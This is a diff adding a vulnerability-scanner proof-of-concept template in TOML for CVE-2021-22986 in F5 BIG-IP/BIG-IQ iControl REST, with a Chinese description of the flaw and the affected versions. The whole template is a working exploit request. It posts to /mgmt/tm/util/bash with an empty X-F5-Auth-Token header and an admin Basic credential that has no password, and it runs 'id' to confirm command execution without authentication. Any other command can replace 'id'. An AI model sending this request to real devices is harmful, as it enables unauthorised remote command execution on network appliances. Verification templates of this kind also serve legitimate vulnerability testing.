@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "通过向 F5 BIG-IP/BIG-IQ iControl REST 接口发送特制 POST 请求，利用空的 X-F5-Auth-Token 请求头配合 Basic 认证绕过身份验证，调用 /mgmt/tm/util/bash 接口执行任意系统命令，验证目标是否存在未授权远程代码执行漏洞。该漏洞影响 BIG-IP 16.0.x（16.0.1.1 之前）、15.1.x（15.1.2.1 之前）等多个版本，攻击者仅需能够通过网络访问设备管理接口的 443 端口即可发起攻击，无需任何凭据。"
+id = "POC-AVE-2021-0808"
+name = "F5 BIG-IP iControl REST 未授权远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2021-0808"]
+vuln_id = [
+    "CVE-2021-22986",
+    "AVE-2021-0808",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mgmt/tm/util/bash"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"command":"run","utilCmdArgs":"-c id"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Basic YWRtaW46"
+Content-Type = "application/json"
+X-F5-Auth-Token = ""
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "commandResult",
+    "uid=",
+]
